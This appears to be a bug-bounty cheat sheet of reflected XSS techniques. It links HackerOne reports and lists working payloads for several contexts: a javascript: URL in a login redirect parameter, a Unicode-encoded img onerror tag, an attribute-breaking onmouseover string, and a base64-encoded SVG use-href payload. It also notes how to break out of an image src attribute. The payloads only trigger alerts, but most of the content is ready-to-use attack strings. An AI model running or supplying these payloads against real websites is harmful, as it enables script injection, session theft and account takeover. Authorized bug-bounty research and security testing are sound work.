## Reflected
### XSS at login redirect_url
* https://hackerone.com/reports/2055132
* https://hackerone.com/reports/1167272
* https://hackerone.com/reports/1502099
* Payload - `javascript:alert(document.domain)`

#### Unicode encoded
* https://hackerone.com/reports/1363001
* payload - `\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e`

#### 404 page 
* https://hackerone.com/reports/1892317
* payload - `%22%20onmouseover=%22prompt(1)%22%20x=%22`

#### Post parameter
* https://hackerone.com/reports/2051085

#### SVG Payload 
* https://hackerone.com/reports/1694173
* payload - `<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/></svg>`

#### XSS in `value=large-5.jpg` in url
* as this value is reflected image tag src by comming out of src attribute u can fire rxss
